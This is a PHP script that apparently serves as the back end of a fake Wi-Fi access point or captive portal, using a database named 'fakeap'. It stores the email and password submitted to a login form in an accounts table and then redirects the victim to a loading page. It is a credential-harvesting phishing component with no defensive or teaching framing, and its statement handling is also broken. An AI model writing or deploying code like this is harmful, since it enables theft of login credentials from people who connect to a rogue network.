<?php
session_start();
ob_start();
$host="localhost";
$username="user";
$pass="password";
$dbname="fakeap";
$tbl_name="accounts";
// Create connection
$conn = mysqli_connect($host, $username, $pass, $dbname);// Check connection
if ($conn) {
    $email=$_POST['email'];
    $password=$_POST['password'];
    $sql_statement = "INSERT INTO accounts (email, password) VALUES (?, ?)";
    mysqli_prepare($conn, $sql_statement);
    mysqli_stmt_bind_param($sql_statement, "ss", $email, $password);
    mysqli_stmt_execute($sql_statement);
    mysqli_close($conn);
}
sleep(1);
header("location:loading.html");
ob_end_flush();
?>
